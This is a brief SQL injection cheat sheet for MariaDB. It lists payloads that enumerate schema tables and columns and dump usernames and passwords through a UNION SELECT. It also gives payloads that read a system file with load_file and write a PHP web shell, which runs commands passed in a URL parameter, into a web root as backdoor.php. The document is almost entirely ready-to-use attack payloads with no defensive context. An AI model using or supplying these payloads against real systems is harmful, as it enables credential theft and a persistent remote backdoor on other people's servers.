# MariaDB Hacking

## Data exfiltration
```sql
@@version
user()
table_name from information_schema.tables
column_name from information_schema.columns where table_name='users'
union all select 1, username, password from users
```

## Code Execution

```sql
load_file('C:/Windows/System32/drivers/etc/hosts')
union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
```